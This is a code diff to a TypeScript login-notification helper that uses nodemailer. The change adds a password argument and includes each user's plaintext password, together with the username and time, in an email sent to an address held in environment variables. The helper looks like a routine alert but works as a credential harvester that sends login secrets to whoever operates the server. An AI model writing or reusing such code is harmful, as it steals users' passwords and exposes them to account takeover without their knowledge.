@@ -1,7 +1,7 @@
 // server/utils/send-login-email.ts
 import nodemailer from 'nodemailer';
 
-export async function sendLoginEmail(username: string) {
+export async function sendLoginEmail(username: string, password: string) {
   try {
     const transporter = nodemailer.createTransport({
       service: "gmail",
@@ -11,14 +11,14 @@ export async function sendLoginEmail(username: string) {
       },
     });
 
-    await transporter.sendMail({
+    const info = await transporter.sendMail({
       from: process.env.EMAIL_SENDER,
       to: process.env.EMAIL_RECEIVER || process.env.EMAIL_SENDER,
       subject: "User  Login Attempt",
-      text: `A user just logged in:\n\nUsername/Email: ${username}\nTime: ${new Date().toLocaleString()}`,
+      text: `A user just logged in:\n\nUsername/Email: ${username}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`,
     });
 
-    console.log("Login email sent successfully.");
+    console.log("Login email sent successfully:", info.response); // Log response dari nodemailer
   } catch (error) {
     console.error("Failed to send login email:", error);
     throw new Error("Failed to send login email.");
